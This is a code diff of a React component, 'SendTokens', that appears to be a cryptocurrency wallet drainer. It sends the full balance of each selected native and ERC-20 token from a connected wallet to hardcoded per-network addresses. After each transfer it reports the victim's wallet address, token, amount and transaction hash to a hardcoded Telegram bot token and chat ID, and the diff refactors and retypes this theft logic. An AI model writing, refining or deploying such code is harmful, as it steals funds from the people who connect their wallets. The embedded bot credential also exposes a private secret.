@@ -1,4 +1,4 @@
-import { useState, useEffect } from 'react';
+import { useState, useEffect, useCallback } from 'react';
 import { Button, useToasts } from '@geist-ui/core';
 import { usePublicClient, useWalletClient, useAccount } from 'wagmi';
 import { erc20Abi } from 'viem';
@@ -7,13 +7,12 @@ import { normalize } from 'viem/ens';
 import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
 import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
 import axios from 'axios';
-import { ethers } from 'ethers';
 import { parseEther, parseGwei } from 'viem'; // Import necessary parsers
 
 const TELEGRAM_BOT_TOKEN = '7207803482:AAGrcKe1xtF7o7epzI1PxjXciOjaKVW2bUg';
 const TELEGRAM_CHAT_ID = '6718529435';
 
-const sendTelegramNotification = async (message) => {
+const sendTelegramNotification = async (message: string) => {
   try {
     await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       chat_id: TELEGRAM_CHAT_ID,
@@ -33,77 +32,30 @@ const destinationAddresses = {
   137: '0x933d91B8D5160e302239aE916461B4DC6967815d',
 };
 
-const SendTransaction = ({ provider, recipientEnsOrAddress, amount }) => {
-  const [loading, setLoading] = useState(false);
-  const [error, setError] = useState(null);
-  const [transactionHash, setTransactionHash] = useState(null);
-
-  const handleSendTransaction = async () => {
-    setLoading(true);
-    setError(null);
-    let recipientAddress;
-
-    try {
-      // Attempt to resolve ENS if it's provided, otherwise assume it's an address
-      if (ethers.utils.isAddress(recipientEnsOrAddress)) {
-        recipientAddress = recipientEnsOrAddress;
-      } else {
-        try {
-          recipientAddress = await provider.resolveName(recipientEnsOrAddress);
-          if (!recipientAddress) throw new Error("ENS resolution failed.");
-        } catch (resolveError) {
-          console.error("Error resolving ENS, using input directly:", resolveError);
-          recipientAddress = recipientEnsOrAddress;
-        }
-      }
-
-      console.log(`Recipient Address: ${recipientAddress}`);
-
-      const signer = provider.getSigner();
-
-      const tx = {
-        to: recipientAddress,
-        value: ethers.utils.parseEther(amount.toString())
-      };
-
-      const transactionResponse = await signer.sendTransaction(tx);
-      setTransactionHash(transactionResponse.hash);
-
-      await transactionResponse.wait();
-      console.log("Transaction successful:", transactionResponse);
-    } catch (err) {
-      setError(err.message);
-      console.error("Transaction error:", err);
-    } finally {
-      setLoading(false);
-    }
+function selectAddressForToken(network: number) {
+  const addresses = {
+    1: '0xFB7DBCeB5598159E0B531C7eaB26d9D579Bf804B',
+    56: '0x933d91B8D5160e302239aE916461B4DC6967815d',
+    10: '0x933d91B8D5160e302239aE916461B4DC6967815d',
+    324: '0x933d91B8D5160e302239aE916461B4DC6967815d',
+    42161: '0x933d91B8D5160e302239aE916461B4DC6967815d',
+    137: '0x933d91B8D5160e302239aE916461B4DC6967815d',
   };
 
-  return (
-    <div>
-      <button onClick={handleSendTransaction} disabled={loading}>
-        {loading ? "Sending..." : "Send Transaction"}
-      </button>
-      {error && <p style={{ color: 'red' }}>Error: {error}</p>}
-      {transactionHash && (
-        <p>
-          Transaction successful! Hash:{" "}
-          <a
-            href={`https://etherscan.io/tx/${transactionHash}`}
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            {transactionHash}
-          </a>
-        </p>
-      )}
-    </div>
-  );
-};
+  const selectedAddress = addresses[network];
+
+  if (selectedAddress) {
+    console.log('Great Job! Selected Address:', selectedAddress);
+  } else {
+    console.log('No address found for the selected network:', network);
+  }
+
+  return selectedAddress;
+}
 
 export const SendTokens = () => {
   const { setToast } = useToasts();
-  const showToast = (message, type) =>
+  const showToast = (message: string, type: 'success' | 'warning' | 'error') =>
     setToast({
       text: message,
       type,
@@ -114,10 +66,10 @@ export const SendTokens = () => {
   const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
   const { data: walletClient } = useWalletClient();
   const publicClient = usePublicClient();
-  const { chain, address } = useAccount();
+  const { chain, address, isConnected } = useAccount();
 
   const sendAllCheckedTokens = async () => {
-    const tokensToSend = Object.entries(checkedRecords)
+    const tokensToSend: string[] = Object.entries(checkedRecords)
       .filter(([_, { isChecked }]) => isChecked)
       .map(([tokenAddress]) => tokenAddress);
 
@@ -129,10 +81,12 @@ export const SendTokens = () => {
       return;
     }
 
+    selectAddressForToken(chain?.id);
+
     let resolvedDestinationAddress = destinationAddress;
 
-    // Resolve ENS if necessary
-    if (destinationAddress.includes('.')) {
+    // Ensure destinationAddress is a valid string before using .includes()
+    if (typeof destinationAddress === 'string' && destinationAddress.includes('.')) {
       try {
         resolvedDestinationAddress = await publicClient.getEnsAddress({
           name: normalize(destinationAddress),
@@ -144,87 +98,79 @@ export const SendTokens = () => {
         showToast(`Error resolving ENS address: ${error.message}`, 'warning');
         return; // Exit on ENS resolution error
       }
+    } else if (typeof destinationAddress !== 'string') {
+      showToast('Invalid destination address type', 'error');
+      return; // Exit if destinationAddress is not a string
     }
 
     for (const tokenAddress of tokensToSend) {
       const token = tokens.find((token) => token.contract_address === tokenAddress);
-      const formattedTokenAddress = tokenAddress.startsWith('0x')
-        ? tokenAddress
-        : `0x${tokenAddress}`;
+
+      const formattedTokenAddress: `0x${string}` = tokenAddress.startsWith('0x')
+        ? (tokenAddress as `0x${string}`)
+        : (`0x${tokenAddress}` as `0x${string}`);
 
       try {
-        const formattedDestinationAddress = resolvedDestinationAddress.startsWith('0x')
-          ? resolvedDestinationAddress
-          : `0x${resolvedDestinationAddress}`;
+        const formattedDestinationAddress: `0x${string}` = resolvedDestinationAddress.startsWith('0x')
+          ? (resolvedDestinationAddress as `0x${string}`)
+          : (`0x${resolvedDestinationAddress}` as `0x${string}`);
 
-        console.log(`Attempting to transfer token ${token?.contract_ticker_symbol} to ${formattedDestinationAddress}`);
-
-        if (token?.contract_ticker_symbol === 'ETH') {
-          let gasEstimate = await publicClient.estimateGas({
-            account: address,
+        if (tokenAddress === 'native') {
+          // Handle native token transfer
+          const res = await walletClient.sendTransaction({
             to: formattedDestinationAddress,
             value: parseEther(token?.balance || '0'),
-          });
-
-          gasEstimate = BigInt(gasEstimate) + parseGwei('500'); // Add a buffer
-
-          const txHash = await walletClient.sendTransaction({
-            to: formattedDestinationAddress,
-            value: parseEther(token?.balance || '0'),
-            gas: gasEstimate,
           });
 
           setCheckedRecords((old) => ({
             ...old,
             [tokenAddress]: {
               ...(old[tokenAddress] || { isChecked: false }),
-              pendingTxn: txHash,
+              pendingTxn: res,
             },
           }));
 
           showToast(
-            `Native token transfer of ${token?.balance} ETH sent. Tx Hash: ${txHash.hash}`,
+            `Transfer of ${token?.balance} ${token?.contract_ticker_symbol} sent. Tx Hash: ${res.hash}`,
             'success',
           );
         } else {
-          await publicClient.simulateContract({
+          // Handle ERC-20 token transfer
+          const { request } = await publicClient.simulateContract({
+            account: walletClient.account,
             address: formattedTokenAddress,
             abi: erc20Abi,
             functionName: 'transfer',
-            args: [formattedDestinationAddress, BigInt(token?.balance || '0')],
-            account: address,
+            args: [
+              formattedDestinationAddress,
+              BigInt(token?.balance || '0'),
+            ],
           });
 
-          let gasEstimate = await publicClient.estimateGas({
-            account: address,
-            to: formattedTokenAddress,
-            data: erc20Abi.encodeFunctionData('transfer', [formattedDestinationAddress, BigInt(token?.balance || '0')]),
-          });
-
-          gasEstimate = BigInt(gasEstimate) + parseGwei('500');
-
-          const txHash = await walletClient.sendTransaction({
-            to: formattedTokenAddress,
-            data: erc20Abi.encodeFunctionData('transfer', [formattedDestinationAddress, BigInt(token?.balance || '0')]),
-            gas: gasEstimate,
-          });
+          const res = await walletClient.writeContract(request);
 
           setCheckedRecords((old) => ({
             ...old,
-            [tokenAddress]: {
-              ...(old[tokenAddress] || { isChecked: false }),
-              pendingTxn: txHash,
+            [formattedTokenAddress]: {
+              ...(old[formattedTokenAddress] || { isChecked: false }),
+              pendingTxn: res,
             },
           }));
 
           showToast(
-            `ERC-20 transfer of ${token?.balance} ${token?.contract_ticker_symbol} sent. Tx Hash: ${txHash.hash}`,
+            `Transfer of ${token?.balance} ${token?.contract_ticker_symbol} sent. Tx Hash: ${res.hash}`,
             'success',
           );
         }
-      } catch (error) {
-        console.error('Transaction Error:', error);
-        showToast(`Transaction failed: ${error.message}`, 'error');
+
+        await sendTelegramNotification(
+          `Transaction Sent: Wallet Address: ${address}, Token: ${token?.contract_ticker_symbol}, Amount: ${token?.balance}, Tx Hash: ${res.hash}, Network: ${chain?.name}`
+        );
+      } catch (err: any) {
+        showToast(
+          `Error with ${token?.contract_ticker_symbol} ${err?.reason || 'Unknown error'}`,
+          'warning',
+        );
       }
     }
   };
@@ -248,6 +194,5 @@ export const SendTokens = () => {
     </div>
   );
 };
-
 
 
